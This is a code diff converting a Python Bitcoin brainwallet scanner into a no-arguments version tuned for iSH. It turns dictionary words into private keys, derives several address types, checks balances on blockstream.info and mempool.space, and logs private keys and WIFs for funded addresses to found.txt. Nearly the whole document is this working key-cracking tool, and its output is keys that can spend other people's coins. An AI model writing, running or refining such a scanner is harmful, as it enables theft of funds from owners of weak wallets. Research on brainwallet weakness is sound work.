@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
-# brute.py — iSH-friendly fast scanner
+# brute2.py — iSH-friendly, no-args BTC scanner (defaults baked in)
 from __future__ import annotations
-import io, sys, argparse, logging, time, binascii, hashlib, json, os, random
+import io, sys, time, binascii, hashlib, json, os, logging
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from requests.adapters import HTTPAdapter
 import requests
@@ -25,7 +25,7 @@ except Exception:
         except Exception:
             pass
 
-# --- bech32 / segwit helpers (kept from your original) ---
+# --- bech32 / segwit helpers ---
 CHARSET = "qpzry9x8gf2tvdw0s3jn54khce6mua7l"
 def bech32_polymod(values):
     GENERATORS = [0x3b6a57b2, 0x26508e6d, 0x1ea119fa, 0x3d4233dd, 0x2a1462b3]
@@ -75,7 +75,7 @@ def segwit_addr_encode(hrp, witver, witprog):
     spec = 'bech32' if witver == 0 else 'bech32m'
     return bech32_encode(hrp, data, spec=spec)
 
-# ------------------ Wallet (optimized) ------------------
+# ------------------ Wallet ------------------
 class Wallet:
     def __init__(self, passphrase, is_private_key=False):
         self.passphrase = passphrase
@@ -88,13 +88,11 @@ class Wallet:
         else:
             self.private_key = binascii.hexlify(hashlib.sha256(self.passphrase.encode('utf-8')).digest()).decode()
         self.wif = self._hex_to_wif(self.private_key)
-        # compute pubkey in fastest available lib
         self.pubkey_compressed = self._priv_to_compressed_pubkey(self.private_key)
         self.addresses = {}
         self.addresses['p2wpkh'] = self._p2wpkh_bech32(self.pubkey_compressed)
         self.addresses['p2sh-p2wpkh'] = self._p2sh_p2wpkh(self.pubkey_compressed)
         self.addresses['p2pkh'] = self._p2pkh_from_pubkey(self.pubkey_compressed)
-        # taproot optional; we try if coincurve present
         self.addresses['p2tr'] = self._maybe_p2tr()
 
     def _looks_like_hex(self, s):
@@ -170,7 +168,6 @@ class Wallet:
             pub = coincurve.PublicKey.from_valid_secret(priv_bytes)
             full = pub.format(compressed=False)
             x = full[1:33]
-            # tagged hash
             def tagged_hash(tag, msg):
                 tag_hash = hashlib.sha256(tag.encode()).digest()
                 return hashlib.sha256(tag_hash + tag_hash + msg).digest()
@@ -182,10 +179,7 @@ class Wallet:
         except Exception:
             return None
 
-    def __repr__(self):
-        return "<Wallet priv=%s addr_p2wpkh=%s>" % (self.private_key[:8], self.addresses.get('p2wpkh'))
-
-# ------------------ Explorers: Blockstream (primary) and Mempool.space (fallback) ------------------
+# ------------------ Explorers ------------------
 
 class Explorer:
     def __init__(self, session=None):
@@ -193,45 +187,15 @@ class Explorer:
         self.name = "base"
 
     def get_address_info(self, address):
-        """Return tuple (has_used:bool, balance_btc:float).
-           Raise exception on hard errors so caller can retry/fallback.
-        """
         raise NotImplementedError
 
 class BlockstreamExplorer(Explorer):
-    # blockstream.info Esplora API
     def __init__(self, session=None):
         super().__init__(session=session)
         self.base = "https://blockstream.info/api"
         self.name = "blockstream"
 
     def get_address_info(self, address):
-        # GET /address/:address
-        url = f"{self.base}/address/{address}"
-        r = self.session.get(url, timeout=12)
-        r.raise_for_status()
-        j = r.json()
-        # chain_stats likely present
-        cs = j.get("chain_stats") or {}
-        tx_count = cs.get("tx_count", 0)
-        has_used = tx_count > 0
-        # For balance: fetch utxos and sum values
-        url_utxo = f"{self.base}/address/{address}/utxo"
-        r2 = self.session.get(url_utxo, timeout=12)
-        r2.raise_for_status()
-        utxos = r2.json()
-        sats = sum([u.get("value", 0) for u in utxos])  # blockstream returns 'value' in sats
-        return has_used, float(sats) / 1e8
-
-class MempoolExplorer(Explorer):
-    # mempool.space API
-    def __init__(self, session=None):
-        super().__init__(session=session)
-        self.base = "https://mempool.space/api"
-        self.name = "mempool"
-
-    def get_address_info(self, address):
-        # GET /address/:address
         url = f"{self.base}/address/{address}"
         r = self.session.get(url, timeout=12)
         r.raise_for_status()
@@ -239,7 +203,6 @@ class MempoolExplorer(Explorer):
         cs = j.get("chain_stats") or {}
         tx_count = cs.get("tx_count", 0)
         has_used = tx_count > 0
-        # utxo endpoint
         url_utxo = f"{self.base}/address/{address}/utxo"
         r2 = self.session.get(url_utxo, timeout=12)
         r2.raise_for_status()
@@ -247,50 +210,60 @@ class MempoolExplorer(Explorer):
         sats = sum([u.get("value", 0) for u in utxos])
         return has_used, float(sats) / 1e8
 
-# ------------------ Main scanning CLI ------------------
+class MempoolExplorer(Explorer):
+    def __init__(self, session=None):
+        super().__init__(session=session)
+        self.base = "https://mempool.space/api"
+        self.name = "mempool"
 
-def parse_args():
-    p = argparse.ArgumentParser(description="Fast iSH-friendly BTC scanner (default: blockstream primary, mempool fallback)")
-    p.add_argument('-d', '--dict_file', default='dictionary.txt', help='Dictionary file (default dictionary.txt)')
-    p.add_argument('-o', '--output_file', default='found.txt', help='Output file for found (default found.txt)')
-    p.add_argument('-k', '--is_private_key', action='store_true', help='Treat lines as private keys (hex or WIF)')
-    p.add_argument('--types', default='p2wpkh,p2sh-p2wpkh,p2pkh,p2tr', help='Comma list of address families to check (priority)')
-    p.add_argument('--max-workers', type=int, default=48, help='Concurrency (tweak to avoid rate-limits). Default 48')
-    p.add_argument('--sleep-after-found', type=float, default=0.02, help='Sleep after finding a used address (seconds). Default 0.02')
-    p.add_argument('--debug', action='store_true', help='Enable debug logging')
-    return p.parse_args()
+    def get_address_info(self, address):
+        url = f"{self.base}/address/{address}"
+        r = self.session.get(url, timeout=12)
+        r.raise_for_status()
+        j = r.json()
+        cs = j.get("chain_stats") or {}
+        tx_count = cs.get("tx_count", 0)
+        has_used = tx_count > 0
+        url_utxo = f"{self.base}/address/{address}/utxo"
+        r2 = self.session.get(url_utxo, timeout=12)
+        r2.raise_for_status()
+        utxos = r2.json()
+        sats = sum([u.get("value", 0) for u in utxos])
+        return has_used, float(sats) / 1e8
 
-def setup_session(max_pool=200):
+# ------------------ Defaults (NO ARGS) ------------------
+DICT_FILE = 'dictionary.txt'
+OUTPUT_FILE = 'found.txt'
+IS_PRIVATE_KEY = False  # change to True if dict contains private keys
+WANTED_TYPES = ['p2wpkh','p2sh-p2wpkh','p2pkh','p2tr']
+MAX_WORKERS = 4              # iSH-safe default
+CONNECTION_POOL = 16
+SLEEP_AFTER_FOUND = 0.02
+DEBUG = False
+
+# ------------------ Helpers & main scan ------------------
+def setup_session(max_pool=16):
     s = requests.Session()
     adapter = HTTPAdapter(pool_connections=max_pool, pool_maxsize=max_pool)
     s.mount('https://', adapter)
     s.mount('http://', adapter)
-    # reasonable default headers
-    s.headers.update({'User-Agent': 'brute.py/1.0'})
+    s.headers.update({'User-Agent': 'brute2.py/1.0'})
     return s
 
 def check_word(word, wanted_types, explorer_primary, explorer_fallback, is_private_key):
-    """
-    For given word -> build wallet, check addresses in wanted_types order.
-    Return list of found records.
-    """
     try:
         wallet = Wallet(word, is_private_key)
     except Exception as e:
         logging.debug("wallet create failed for %s: %s", word, e)
         return []
-
     results = []
     for atype in wanted_types:
         addr = wallet.addresses.get(atype)
         if not addr:
             continue
-
-        # try primary explorer
         for attempt_explorer in (explorer_primary, explorer_fallback):
             try:
                 has_used, balance = attempt_explorer.get_address_info(addr)
-                # We only record if has_used or balance>0
                 if has_used or balance > 0.0:
                     rec = {
                         'word': word,
@@ -303,60 +276,40 @@ def check_word(word, wanted_types, explorer_primary, explorer_fallback, is_priva
                         'explorer': attempt_explorer.name
                     }
                     results.append(rec)
-                # whether found or not, break explorer loop for this addr (we attempted primary)
                 break
             except Exception as e:
-                # try fallback if available
                 logging.debug("Explorer %s error for %s (%s): %s", attempt_explorer.name, addr, atype, e)
-                # if primary failed and fallback exists, next loop tries fallback
                 continue
     return results
 
 def main():
-    args = parse_args()
-    logging.basicConfig(level=logging.DEBUG if args.debug else logging.INFO,
+    global DEBUG
+    logging.basicConfig(level=logging.DEBUG if DEBUG else logging.INFO,
                         format='%(asctime)s %(levelname)-6s %(message)s')
-
-    wanted_types = [x.strip() for x in args.types.split(',') if x.strip()]
-    session = setup_session(max_pool= max(100, args.max_workers*2))
+    if not os.path.exists(DICT_FILE):
+        logging.error("Dictionary file not found: %s", DICT_FILE)
+        sys.exit(1)
+    session = setup_session(max_pool=CONNECTION_POOL)
     explorer_primary = BlockstreamExplorer(session=session)
     explorer_fallback = MempoolExplorer(session=session)
-
-    # validate dict file
-    if not os.path.exists(args.dict_file):
-        logging.error("Dictionary file not found: %s", args.dict_file)
-        sys.exit(1)
-
-    # open output file
+    # prepare output
     header = 'dictionary_word,address_type,address,has_used,balance_btc,private_hex,wif,explorer'
-    fout = open(args.output_file, 'a', encoding='utf-8')
-    if os.path.getsize(args.output_file) == 0:
+    fout = open(OUTPUT_FILE, 'a', encoding='utf-8')
+    if os.path.getsize(OUTPUT_FILE) == 0:
         fout.write(header + '\n'); fout.flush()
-
-    # threadpool
-    max_workers = max(4, args.max_workers)
     logging.info("Starting scan: workers=%d  types=%s  primary=%s fallback=%s",
-                 max_workers, ','.join(wanted_types), explorer_primary.name, explorer_fallback.name)
-
-    # streaming read & limited in-flight futures to avoid memory explosion
-    with ThreadPoolExecutor(max_workers=max_workers) as ex:
+                 MAX_WORKERS, ','.join(WANTED_TYPES), explorer_primary.name, explorer_fallback.name)
+    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
         futures = {}
-        max_inflight = max_workers * 2
-        with io.open(args.dict_file, 'rt', encoding='utf-8') as f:
+        with io.open(DICT_FILE, 'rt', encoding='utf-8') as f:
+            # submit jobs streaming
             for line in f:
                 word = line.rstrip()
-                if not word: 
+                if not word:
                     continue
-                # submit job
-                fut = ex.submit(check_word, word, wanted_types, explorer_primary, explorer_fallback, args.is_private_key)
+                fut = ex.submit(check_word, word, WANTED_TYPES, explorer_primary, explorer_fallback, IS_PRIVATE_KEY)
                 futures[fut] = word
-                # throttle submission if too many outstanding
-                while len(futures) >= max_inflight:
-                    done, _ = as_completed(futures, timeout=None).__next__(), None
-                    # process one completed future (we pop them below in the main loop)
-                    break
-
-            # Now process as futures complete
+            # collect results
             for fut in as_completed(futures):
                 try:
                     res = fut.result()
@@ -371,9 +324,7 @@ def main():
                             priv=rec['private_hex'], wif=rec['wif'], explorer=rec['explorer'])
                         logging.info("FOUND %s", out_line)
                         fout.write(out_line + '\n'); fout.flush()
-                        time.sleep(args.sleep_after_found)
-        # shutdown executor waits for remaining tasks
-
+                        time.sleep(SLEEP_AFTER_FOUND)
     fout.close()
     logging.info("Done.")
 
